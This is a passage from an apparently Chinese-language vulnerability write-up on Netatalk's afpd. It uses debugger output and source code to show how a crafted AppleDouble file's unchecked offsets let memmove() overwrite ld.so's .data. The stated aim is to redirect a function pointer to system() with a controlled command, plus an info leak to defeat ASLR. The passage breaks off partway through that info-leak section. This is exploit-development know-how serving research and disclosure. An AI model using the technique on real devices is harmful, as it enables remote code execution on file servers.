</span></pre></table></code></div></div><p>因此我们控制了AppleDouble文件的所有字段。更确切地说，我们知道我们可以为我们需要的所有entry精心构造非法的EID“偏移”，这一切都因为之前讨论过的<code class="language-plaintext highlighter-rouge">parse_entries()</code>函数的返回值没有被检查。此外，我们可以通过拥有更大的数据来精心构造所需大小的资源fork文件。这意味着我们可以有效控制<code class="language-plaintext highlighter-rouge">memmove()</code>函数的源地址、目的地址以及长度参数，来向内存映射之外的地址空间写入我们控制的数据。</p><p>注意：我们需要的entry是<code class="language-plaintext highlighter-rouge">ADEID_FINDERI</code>和<code class="language-plaintext highlighter-rouge">ADEID_RFORK</code>：</p><div lang="c++" class="language-c++ highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>    <span class="n">memmove</span><span class="p">(</span><span class="n">map</span> <span class="o">+</span> <span class="n">ad_getentryoff</span><span class="p">(</span><span class="n">ad</span><span class="p">,</span> <span class="n">ADEID_FINDERI</span><span class="p">)</span> <span class="o">+</span> <span class="n">ADEDLEN_FINDERI</span><span class="p">,</span>
            <span class="n">map</span> <span class="o">+</span> <span class="n">ad_getentryoff</span><span class="p">(</span><span class="n">ad</span><span class="p">,</span> <span class="n">ADEID_RFORK</span><span class="p">),</span>
            <span class="n">ad_getentrylen</span><span class="p">(</span><span class="n">ad</span><span class="p">,</span> <span class="n">ADEID_RFORK</span><span class="p">));</span>
</pre></table></code></div></div><p>下一个问题是，内存映射的地址被映射到了哪里？</p><p>通过实际测试我们发现，如果fork文件的大小小于0x1000字节，文件将被映射到<code class="language-plaintext highlighter-rouge">uams_pam.so</code>，<code class="language-plaintext highlighter-rouge">uams_guest.so</code>和<code class="language-plaintext highlighter-rouge">ld-2.28.so</code>之前的非常高的地址位置。更确切地说，<code class="language-plaintext highlighter-rouge">ld-2.28.so</code>在内存中的映射起始地址总是在被映射的fork文件起始地址之后的0xC0000字节处，即使ASLR开放：</p><div lang="plaintext" class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
</pre><td class="rouge-code"><pre>(gdb) info proc mappings 
process 26343
Mapped address spaces:

          Start Addr           End Addr       Size     Offset objfile
      0x5579bb534000     0x5579bb53d000     0x9000        0x0 /usr/local/modules/usr/sbin/afpd
      0x5579bb53d000     0x5579bb571000    0x34000     0x9000 /usr/local/modules/usr/sbin/afpd
      0x5579bb571000     0x5579bb57c000     0xb000    0x3d000 /usr/local/modules/usr/sbin/afpd
      0x5579bb57c000     0x5579bb57d000     0x1000    0x47000 /usr/local/modules/usr/sbin/afpd
      0x5579bb57d000     0x5579bb580000     0x3000    0x48000 /usr/local/modules/usr/sbin/afpd
      0x5579bb580000     0x5579bb5a0000    0x20000        0x0 
      0x5579bcd51000     0x5579bcd72000    0x21000        0x0 [heap]
      0x5579bcd72000     0x5579bcd92000    0x20000        0x0 [heap]
      0x7f6c56e30000     0x7f6c56eb0000    0x80000        0x0 
      ...
      0x7f6c57e02000     0x7f6c57e24000    0x22000        0x0 /lib/libc-2.28.so
      0x7f6c57e24000     0x7f6c57f6c000   0x148000    0x22000 /lib/libc-2.28.so
      0x7f6c57f6c000     0x7f6c57fb8000    0x4c000   0x16a000 /lib/libc-2.28.so
      0x7f6c57fb8000     0x7f6c57fb9000     0x1000   0x1b6000 /lib/libc-2.28.so
      0x7f6c57fb9000     0x7f6c57fbd000     0x4000   0x1b6000 /lib/libc-2.28.so
      0x7f6c57fbd000     0x7f6c57fbf000     0x2000   0x1ba000 /lib/libc-2.28.so
      ...
      0x7f6c58129000     0x7f6c58134000     0xb000        0x0 /usr/local/modules/lib/libatalk.so.18.0.0
      0x7f6c58134000     0x7f6c58177000    0x43000     0xb000 /usr/local/modules/lib/libatalk.so.18.0.0
      0x7f6c58177000     0x7f6c58191000    0x1a000    0x4e000 /usr/local/modules/lib/libatalk.so.18.0.0
      0x7f6c58191000     0x7f6c58192000     0x1000    0x67000 /usr/local/modules/lib/libatalk.so.18.0.0
      0x7f6c58192000     0x7f6c58194000     0x2000    0x68000 /usr/local/modules/lib/libatalk.so.18.0.0
      0x7f6c58194000     0x7f6c581b1000    0x1d000        0x0 
      0x7f6c581b2000     0x7f6c581b3000     0x1000        0x0 /mnt/HD/HD_a2/Public/edg/._mooncake
      0x7f6c581b3000     0x7f6c581b4000     0x1000        0x0 /usr/local/modules/lib/netatalk/uams_pam.so
      0x7f6c581b4000     0x7f6c581b6000     0x2000     0x1000 /usr/local/modules/lib/netatalk/uams_pam.so
      0x7f6c581b6000     0x7f6c581b7000     0x1000     0x3000 /usr/local/modules/lib/netatalk/uams_pam.so
      0x7f6c581b7000     0x7f6c581b8000     0x1000     0x3000 /usr/local/modules/lib/netatalk/uams_pam.so
      0x7f6c581b8000     0x7f6c581b9000     0x1000     0x4000 /usr/local/modules/lib/netatalk/uams_pam.so
      0x7f6c581b9000     0x7f6c581ba000     0x1000        0x0 /usr/local/modules/lib/netatalk/uams_guest.so
      0x7f6c581ba000     0x7f6c581bb000     0x1000     0x1000 /usr/local/modules/lib/netatalk/uams_guest.so
      0x7f6c581bb000     0x7f6c581bc000     0x1000     0x2000 /usr/local/modules/lib/netatalk/uams_guest.so
      0x7f6c581bc000     0x7f6c581bd000     0x1000     0x2000 /usr/local/modules/lib/netatalk/uams_guest.so
      0x7f6c581bd000     0x7f6c581be000     0x1000     0x3000 /usr/local/modules/lib/netatalk/uams_guest.so
      0x7f6c581be000     0x7f6c581bf000     0x1000        0x0 /lib/ld-2.28.so
      0x7f6c581bf000     0x7f6c581dd000    0x1e000     0x1000 /lib/ld-2.28.so
      0x7f6c581dd000     0x7f6c581e5000     0x8000    0x1f000 /lib/ld-2.28.so
      0x7f6c581e5000     0x7f6c581e6000     0x1000    0x26000 /lib/ld-2.28.so
      0x7f6c581e6000     0x7f6c581e7000     0x1000    0x27000 /lib/ld-2.28.so
      0x7f6c581e7000     0x7f6c581e8000     0x1000        0x0 
      0x7ffe86f2b000     0x7ffe86f71000    0x46000        0x0 [stack]
      0x7ffe86fb7000     0x7ffe86fba000     0x3000        0x0 [vvar]
      0x7ffe86fba000     0x7ffe86fbc000     0x2000        0x0 [vdso]
  0xffffffffff600000 0xffffffffff601000     0x1000        0x0 [vsyscall]
</pre></table></code></div></div><p>这意味着我们可以使用<code class="language-plaintext highlighter-rouge">memmove()</code>函数来覆盖上述我们提到的动态库中的一些内容。那么我们应该选择哪个动态库呢？</p><p>通过调试我们注意到，当崩溃发生时，如果我们继续执行，Netatalk中的一个特殊的异常处理函数会接受并处理当前异常。</p><p>更准确地说，我们覆盖了整个<code class="language-plaintext highlighter-rouge">ld-2.28.so</code>的<code class="language-plaintext highlighter-rouge">.data</code>段，并最终触发下面的崩溃：</p><div lang="plaintext" class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
</pre><td class="rouge-code"><pre>(remote-gdb) bt
#0  0x00007f423de3eb50 in _dl_open (file=0x7f423dbf0e86 "libgcc_s.so.1", mode=-2147483646, caller_dlopen=0x7f423db771c5 &lt;init+21&gt;, nsid=-2, argc=4, argv=0x7fffa4967cf8, env=0x7fffa4967d20) at dl-open.c:548
#1  0x00007f423dba406d in do_dlopen (Reading in symbols for dl-error.c...done.
ptr=ptr@entry=0x7fffa4966170) at dl-libc.c:96
#2  0x00007f423dba4b2f in __GI__dl_catch_exception (exception=exception@entry=0x7fffa49660f0, operate=operate@entry=0x7f423dba4030 &lt;do_dlopen&gt;, args=args@entry=0x7fffa4966170) at dl-error-skeleton.c:196
#3  0x00007f423dba4bbf in __GI__dl_catch_error (objname=objname@entry=0x7fffa4966148, errstring=errstring@entry=0x7fffa4966150, mallocedp=mallocedp@entry=0x7fffa4966147, operate=operate@entry=0x7f423dba4030 &lt;do_dlopen&gt;, args=args@entry=0x7fffa4966170) at dl-error-skeleton.c:215
#4  0x00007f423dba4147 in dlerror_run (operate=operate@entry=0x7f423dba4030 &lt;do_dlopen&gt;, args=args@entry=0x7fffa4966170) at dl-libc.c:46
#5  0x00007f423dba41d6 in __GI___libc_dlopen_mode (name=name@entry=0x7f423dbf0e86 "libgcc_s.so.1", mode=mode@entry=-2147483646) at dl-libc.c:195
#6  0x00007f423db771c5 in init () at backtrace.c:53
Reading in symbols for pthread_once.c...done.
#7  0x00007f423dc40997 in __pthread_once_slow (once_control=0x7f423dc2ef80 &lt;once&gt;, init_routine=0x7f423db771b0 &lt;init&gt;) at pthread_once.c:116
#8  0x00007f423db77304 in __GI___backtrace (array=&lt;optimised out&gt;, size=&lt;optimised out&gt;) at backtrace.c:106
#9  0x00007f423ddcd6db in netatalk_panic () from symbols/lib64/libatalk.so.18
#10 0x00007f423ddcd902 in ?? () from symbols/lib64/libatalk.so.18
#11 0x00007f423ddcd958 in ?? () from symbols/lib64/libatalk.so.18
Reading in symbols for ../sysdeps/unix/sysv/linux/x86_64/sigaction.c...done.
#12 &lt;signal handler called&gt;
#13 __memmove_sse2_unaligned_erms () at ../sysdeps/x86_64/multiarch/memmove-vec-unaligned-erms.S:238
#14 0x00007f423dda6fd0 in ad_rebuild_adouble_header_osx () from symbols/lib64/libatalk.so.18
#15 0x00007f423ddaa985 in ?? () from symbols/lib64/libatalk.so.18
#16 0x00007f423ddaaf34 in ?? () from symbols/lib64/libatalk.so.18
#17 0x00007f423ddad7b0 in ?? () from symbols/lib64/libatalk.so.18
#18 0x00007f423ddad9e1 in ?? () from symbols/lib64/libatalk.so.18
#19 0x00007f423ddae56c in ad_open () from symbols/lib64/libatalk.so.18
#20 0x000055cd275c1ea7 in afp_openfork ()
#21 0x000055cd275a386e in afp_over_dsi ()
#22 0x000055cd275c6ba3 in ?? ()
#23 0x000055cd275c68fd in main ()
</pre></table></code></div></div><p>我们可以看到，程序崩溃在一条<code class="language-plaintext highlighter-rouge">call</code>指令，在这条这令处，我们同时控制了被调用的函数地址以及第一个参数。</p><div lang="plaintext" class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre>(remote-gdb) x /i $pc
=&gt; 0x7f423de3eb50 &lt;_dl_open+48&gt;:	call   QWORD PTR [rip+0x16412]        # 0x7f423de54f68 &lt;_rtld_global+3848&gt;
(remote-gdb) x /gx 0x7f423de54f68
0x7f423de54f68 &lt;_rtld_global+3848&gt;:	0x4242424242424242
(remote-gdb) x /s $rdi
0x7f423de54968 &lt;_rtld_global+2312&gt;:	'A' &lt;repeats 35 times&gt;
</pre></table></code></div></div><p>在IDA中检查<code class="language-plaintext highlighter-rouge">ld-2.28.so</code>可知，这是由于<code class="language-plaintext highlighter-rouge">dl_open()</code>函数调用<code class="language-plaintext highlighter-rouge">_dl_rtld_lock_recursive</code>函数指针并传递了一个指向<code class="language-plaintext highlighter-rouge">_dl_load_lock</code> lock的指针作为参数。</p><div lang="c++" class="language-c++ highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre><td class="rouge-code"><pre><span class="kt">void</span> <span class="o">*</span><span class="kr">__fastcall</span> <span class="nf">dl_open</span><span class="p">(</span>
        <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">file</span><span class="p">,</span>
        <span class="kt">int</span> <span class="n">mode</span><span class="p">,</span>
        <span class="k">const</span> <span class="kt">void</span> <span class="o">*</span><span class="n">caller_dlopen</span><span class="p">,</span>
        <span class="n">Lmid_t</span> <span class="n">nsid</span><span class="p">,</span>
        <span class="kt">int</span> <span class="n">argc</span><span class="p">,</span>
        <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span>
        <span class="kt">char</span> <span class="o">**</span><span class="n">env</span><span class="p">)</span>
<span class="p">{</span>
  <span class="c1">// [COLLAPSED LOCAL DECLARATIONS. PRESS KEYPAD CTRL-"+" TO EXPAND]</span>

  <span class="k">if</span> <span class="p">(</span> <span class="p">(</span><span class="n">mode</span> <span class="o">&amp;</span> <span class="mi">3</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span> <span class="p">)</span>
    <span class="n">_dl_signal_error</span><span class="p">(</span><span class="mh">0x16</span><span class="p">,</span> <span class="n">file</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">,</span> <span class="s">"invalid mode for dlopen()"</span><span class="p">);</span>
  <span class="n">rtld_local</span><span class="p">.</span><span class="n">_dl_rtld_lock_recursive</span><span class="p">(</span><span class="o">&amp;</span><span class="n">rtld_local</span><span class="p">.</span><span class="n">_dl_load_lock</span><span class="p">);</span>
</pre></table></code></div></div><p>函数指针和lock参数都是<code class="language-plaintext highlighter-rouge">rtld_local</code>全局变量的一部分，它位于<code class="language-plaintext highlighter-rouge">.data</code>段当中。</p><div lang="plaintext" class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>.data:0000000000028060 ; rtld_global rtld_local
.data:0000000000028060 _rtld_local     dq 0  
</pre></table></code></div></div><p>因此，当我们可以覆盖<code class="language-plaintext highlighter-rouge">ld.so</code>的<code class="language-plaintext highlighter-rouge">.data</code>段时，调用任意的只有一个参数的函数来利用漏洞是一个非常通用的办法。</p><p>注意：这里还有另一种类似的<a href="https://dangokyo.me/2018/01/20/extra-exploitation-technique-1-_dl_open/">技术</a>（尽管有一点不同）</p><p>我们的目标是：通过将lock参数覆盖为一条shell命令并将函数指针覆盖为<code class="language-plaintext highlighter-rouge">system()</code>函数的地址来实现任意命令执行。</p><p>幸运的是，我们知道了我们已经控制了传递给<code class="language-plaintext highlighter-rouge">system()</code>函数的数据，因此我们不需要去知道它在内存中的位置。然而，由于ASLR开启，我们并不知道<code class="language-plaintext highlighter-rouge">system()</code>函数在内存中的地址。因此我们需要信息泄露的利用原语来绕过ASLR。</p><h2 id="构建一个信息泄露利用">构建一个信息泄露利用</h2><p>如果我们检查先前的backtrace，我们可以看到程序实际上崩溃在了<code class="language-plaintext highlighter-rouge">ad_rebuild_adouble_header_osx()</code>函数。更准确地说，我们发现了在<code class="language-plaintext highlighter-rouge">ad_convert_osx()</code>函数中发生了以下几件事：</p><ul><li>原始的AppleDouble文件通过<code class="language-plaintext highlighter-rouge">mmap()</code>函数被映射进内存<li>先前讨论的<code class="language-plaintext highlighter-rouge">memmove()</code>被调用，用来丢弃FinderInfo部分的内容<li><code class="language-plaintext highlighter-rouge">ad_rebuild_adouble_header_osx()</code>函数被调用<li>被映射的文件通过<code class="language-plaintext highlighter-rouge">munmap()</code>函数被取消映射</ul><div lang="c++" class="language-c++ highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
</pre><td class="rouge-code"><pre><span class="c1">//netatalk-3.1.12/libatalk/adouble/ad_open.c</span>
<span class="cm">/**
 * Convert from Apple's ._ file to Netatalk
 *
 * Apple's AppleDouble may contain a FinderInfo entry longer then 32 bytes
 * containing packed xattrs. Netatalk can't deal with that, so we
 * simply discard the packed xattrs.
 *
 * As we call ad_open() which might result in a recursion, just to be sure
 * use static variable in_conversion to check for that.
 *
 * Returns -1 in case an error occured, 0 if no conversion was done, 1 otherwise
 **/</span>
<span class="k">static</span> <span class="kt">int</span> <span class="nf">ad_convert_osx</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">path</span><span class="p">,</span> <span class="k">struct</span> <span class="nc">adouble</span> <span class="o">*</span><span class="n">ad</span><span class="p">)</span>
<span class="p">{</span>
    <span class="n">EC_INIT</span><span class="p">;</span>
    <span class="k">static</span> <span class="kt">bool</span> <span class="n">in_conversion</span> <span class="o">=</span> <span class="nb">false</span><span class="p">;</span>
    <span class="kt">char</span> <span class="o">*</span><span class="n">map</span><span class="p">;</span>
    <span class="kt">int</span> <span class="n">finderlen</span> <span class="o">=</span> <span class="n">ad_getentrylen</span><span class="p">(</span><span class="n">ad</span><span class="p">,</span> <span class="n">ADEID_FINDERI</span><span class="p">);</span>
    <span class="kt">ssize_t</span> <span class="n">origlen</span><span class="p">;</span>

    <span class="k">if</span> <span class="p">(</span><span class="n">in_conversion</span> <span class="o">||</span> <span class="n">finderlen</span> <span class="o">==</span> <span class="n">ADEDLEN_FINDERI</span><span class="p">)</span>
        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
    <span class="n">in_conversion</span> <span class="o">=</span> <span class="nb">true</span><span class="p">;</span>

    <span class="n">LOG</span><span class="p">(</span><span class="n">log_debug</span><span class="p">,</span> <span class="n">logtype_ad</span><span class="p">,</span> <span class="s">"Converting OS X AppleDouble %s, FinderInfo length: %d"</span><span class="p">,</span>
        <span class="n">fullpathname</span><span class="p">(</span><span class="n">path</span><span class="p">),</span> <span class="n">finderlen</span><span class="p">);</span>

    <span class="n">origlen</span> <span class="o">=</span> <span class="n">ad_getentryoff</span><span class="p">(</span><span class="n">ad</span><span class="p">,</span> <span class="n">ADEID_RFORK</span><span class="p">)</span> <span class="o">+</span> <span class="n">ad_getentrylen</span><span class="p">(</span><span class="n">ad</span><span class="p">,</span> <span class="n">ADEID_RFORK</span><span class="p">);</span>

    <span class="n">map</span> <span class="o">=</span> <span class="n">mmap</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="n">origlen</span><span class="p">,</span> <span class="n">PROT_READ</span> <span class="o">|</span> <span class="n">PROT_WRITE</span><span class="p">,</span> <span class="n">MAP_SHARED</span><span class="p">,</span> <span class="n">ad_reso_fileno</span><span class="p">(</span><span class="n">ad</span><span class="p">),</span> <span class="mi">0</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">map</span> <span class="o">==</span> <span class="n">MAP_FAILED</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">LOG</span><span class="p">(</span><span class="n">log_error</span><span class="p">,</span> <span class="n">logtype_ad</span><span class="p">,</span> <span class="s">"mmap AppleDouble: %s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">strerror</span><span class="p">(</span><span class="n">errno</span><span class="p">));</span>
        <span class="n">EC_FAIL</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="n">memmove</span><span class="p">(</span><span class="n">map</span> <span class="o">+</span> <span class="n">ad_getentryoff</span><span class="p">(</span><span class="n">ad</span><span class="p">,</span> <span class="n">ADEID_FINDERI</span><span class="p">)</span> <span class="o">+</span> <span class="n">ADEDLEN_FINDERI</span><span class="p">,</span>
            <span class="n">map</span> <span class="o">+</span> <span class="n">ad_getentryoff</span><span class="p">(</span><span class="n">ad</span><span class="p">,</span> <span class="n">ADEID_RFORK</span><span class="p">),</span>
            <span class="n">ad_getentrylen</span><span class="p">(</span><span class="n">ad</span><span class="p">,</span> <span class="n">ADEID_RFORK</span><span class="p">));</span>

    <span class="n">ad_setentrylen</span><span class="p">(</span><span class="n">ad</span><span class="p">,</span> <span class="n">ADEID_FINDERI</span><span class="p">,</span> <span class="n">ADEDLEN_FINDERI</span><span class="p">);</span>
    <span class="n">ad</span><span class="o">-&gt;</span><span class="n">ad_rlen</span> <span class="o">=</span> <span class="n">ad_getentrylen</span><span class="p">(</span><span class="n">ad</span><span class="p">,</span> <span class="n">ADEID_RFORK</span><span class="p">);</span>
    <span class="n">ad_setentryoff</span><span class="p">(</span><span class="n">ad</span><span class="p">,</span> <span class="n">ADEID_RFORK</span><span class="p">,</span> <span class="n">ad_getentryoff</span><span class="p">(</span><span class="n">ad</span><span class="p">,</span> <span class="n">ADEID_FINDERI</span><span class="p">)</span> <span class="o">+</span> <span class="n">ADEDLEN_FINDERI</span><span class="p">);</span>

    <span class="n">EC_ZERO_LOG</span><span class="p">(</span> <span class="n">ftruncate</span><span class="p">(</span><span class="n">ad_reso_fileno</span><span class="p">(</span><span class="n">ad</span><span class="p">),</span>
                           <span class="n">ad_getentryoff</span><span class="p">(</span><span class="n">ad</span><span class="p">,</span> <span class="n">ADEID_RFORK</span><span class="p">)</span>
                           <span class="o">+</span> <span class="n">ad_getentrylen</span><span class="p">(</span><span class="n">ad</span><span class="p">,</span> <span class="n">ADEID_RFORK</span><span class="p">))</span> <span class="p">);</span>

    <span class="p">(</span><span class="kt">void</span><span class="p">)</span><span class="n">ad_rebuild_adouble_header_osx</span><span class="p">(</span><span class="n">ad</span><span class="p">,</span> <span class="n">map</span><span class="p">);</span>
    <span class="n">munmap</span><span class="p">(</span><span class="n">map</span><span class="p">,</span> <span class="n">origlen</span><span class="p">);</span>
</pre></table></code></div></div><p><code class="language-plaintext highlighter-rouge">ad_rebuild_adouble_header_osx()</code>函数如下所示。该函数负责将<code class="language-plaintext highlighter-rouge">adouble</code>结构体中的内容以AppleDouble格式写回被映射的文件区域，因此写回的内容将保存在磁盘上的文件中。</p><div lang="c++" class="language-c++ highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
</pre><td class="rouge-code"><pre><span class="c1">//netatalk-3.1.12/libatalk/adouble/ad_flush.c</span>
<span class="cm">/*!
 * Prepare adbuf buffer from struct adouble for writing on disk
 */</span>
<span class="kt">int</span> <span class="nf">ad_rebuild_adouble_header_osx</span><span class="p">(</span><span class="k">struct</span> <span class="nc">adouble</span> <span class="o">*</span><span class="n">ad</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">adbuf</span><span class="p">)</span>
<span class="p">{</span>
    <span class="kt">uint32_t</span>       <span class="n">temp</span><span class="p">;</span>
    <span class="kt">uint16_t</span>       <span class="n">nent</span><span class="p">;</span>
    <span class="kt">char</span>           <span class="o">*</span><span class="n">buf</span><span class="p">;</span>

    <span class="n">LOG</span><span class="p">(</span><span class="n">log_debug</span><span class="p">,</span> <span class="n">logtype_ad</span><span class="p">,</span> <span class="s">"ad_rebuild_adouble_header_osx"</span><span class="p">);</span>

    <span class="n">buf</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">adbuf</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>

    <span class="n">temp</span> <span class="o">=</span> <span class="n">htonl</span><span class="p">(</span> <span class="n">ad</span><span class="o">-&gt;</span><span class="n">ad_magic</span> <span class="p">);</span>
    <span class="n">memcpy</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">temp</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span> <span class="n">temp</span> <span class="p">));</span>
    <span class="n">buf</span> <span class="o">+=</span> <span class="k">sizeof</span><span class="p">(</span> <span class="n">temp</span> <span class="p">);</span>

    <span class="n">temp</span> <span class="o">=</span> <span class="n">htonl</span><span class="p">(</span> <span class="n">ad</span><span class="o">-&gt;</span><span class="n">ad_version</span> <span class="p">);</span>
    <span class="n">memcpy</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">temp</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span> <span class="n">temp</span> <span class="p">));</span>
    <span class="n">buf</span> <span class="o">+=</span> <span class="k">sizeof</span><span class="p">(</span> <span class="n">temp</span> <span class="p">);</span>

    <span class="n">memcpy</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="n">AD_FILLER_NETATALK</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="n">AD_FILLER_NETATALK</span><span class="p">));</span>
    <span class="n">buf</span> <span class="o">+=</span> <span class="k">sizeof</span><span class="p">(</span> <span class="n">ad</span><span class="o">-&gt;</span><span class="n">ad_filler</span> <span class="p">);</span>

    <span class="n">nent</span> <span class="o">=</span> <span class="n">htons</span><span class="p">(</span><span class="n">ADEID_NUM_OSX</span><span class="p">);</span>
    <span class="n">memcpy</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">nent</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span> <span class="n">nent</span> <span class="p">));</span>
    <span class="n">buf</span> <span class="o">+=</span> <span class="k">sizeof</span><span class="p">(</span> <span class="n">nent</span> <span class="p">);</span>

    <span class="cm">/* FinderInfo */</span>
    <span class="n">temp</span> <span class="o">=</span> <span class="n">htonl</span><span class="p">(</span><span class="n">EID_DISK</span><span class="p">(</span><span class="n">ADEID_FINDERI</span><span class="p">));</span>
    <span class="n">memcpy</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">temp</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span> <span class="n">temp</span> <span class="p">));</span>
    <span class="n">buf</span> <span class="o">+=</span> <span class="k">sizeof</span><span class="p">(</span> <span class="n">temp</span> <span class="p">);</span>

    <span class="n">temp</span> <span class="o">=</span> <span class="n">htonl</span><span class="p">(</span><span class="n">ADEDOFF_FINDERI_OSX</span><span class="p">);</span>
    <span class="n">memcpy</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">temp</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span> <span class="n">temp</span> <span class="p">));</span>
    <span class="n">buf</span> <span class="o">+=</span> <span class="k">sizeof</span><span class="p">(</span> <span class="n">temp</span> <span class="p">);</span>

    <span class="n">temp</span> <span class="o">=</span> <span class="n">htonl</span><span class="p">(</span><span class="n">ADEDLEN_FINDERI</span><span class="p">);</span>
    <span class="n">memcpy</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">temp</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span> <span class="n">temp</span> <span class="p">));</span>
    <span class="n">buf</span> <span class="o">+=</span> <span class="k">sizeof</span><span class="p">(</span> <span class="n">temp</span> <span class="p">);</span>

    <span class="n">memcpy</span><span class="p">(</span><span class="n">adbuf</span> <span class="o">+</span> <span class="n">ADEDOFF_FINDERI_OSX</span><span class="p">,</span> <span class="n">ad_entry</span><span class="p">(</span><span class="n">ad</span><span class="p">,</span> <span class="n">ADEID_FINDERI</span><span class="p">),</span> <span class="n">ADEDLEN_FINDERI</span><span class="p">);</span>

    <span class="cm">/* rfork */</span>
    <span class="n">temp</span> <span class="o">=</span> <span class="n">htonl</span><span class="p">(</span> <span class="n">EID_DISK</span><span class="p">(</span><span class="n">ADEID_RFORK</span><span class="p">)</span> <span class="p">);</span>
    <span class="n">memcpy</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">temp</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span> <span class="n">temp</span> <span class="p">));</span>
    <span class="n">buf</span> <span class="o">+=</span> <span class="k">sizeof</span><span class="p">(</span> <span class="n">temp</span> <span class="p">);</span>

    <span class="n">temp</span> <span class="o">=</span> <span class="n">htonl</span><span class="p">(</span><span class="n">ADEDOFF_RFORK_OSX</span><span class="p">);</span>
    <span class="n">memcpy</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">temp</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span> <span class="n">temp</span> <span class="p">));</span>
    <span class="n">buf</span> <span class="o">+=</span> <span class="k">sizeof</span><span class="p">(</span> <span class="n">temp</span> <span class="p">);</span>

    <span class="n">temp</span> <span class="o">=</span> <span class="n">htonl</span><span class="p">(</span> <span class="n">ad</span><span class="o">-&gt;</span><span class="n">ad_rlen</span><span class="p">);</span>
    <span class="n">memcpy</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">temp</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span> <span class="n">temp</span> <span class="p">));</span>
    <span class="n">buf</span> <span class="o">+=</span> <span class="k">sizeof</span><span class="p">(</span> <span class="n">temp</span> <span class="p">);</span>

    <span class="k">return</span> <span class="n">AD_DATASZ_OSX</span><span class="p">;</span>
<span class="p">}</span>
</pre></table></code></div></div><p>但是如果我们在调试器中看一下<code class="language-plaintext highlighter-rouge">memcpy()</code>函数的参数，可以注意到原地址来自于栈上，并且已经越界了：</p><div lang="plaintext" class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>memcpy(0x7f423de20032, 0x7fffa499bbba, 32)
</pre></table></code></div></div><div lang="plaintext" class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre>(gdb) info proc mappings 
...
          Start Addr           End Addr       Size     Offset objfile
      0x7fffa4923000     0x7fffa4969000    0x46000        0x0 [stack]
      0x7fffa49f9000     0x7fffa49fc000     0x3000        0x0 [vvar]
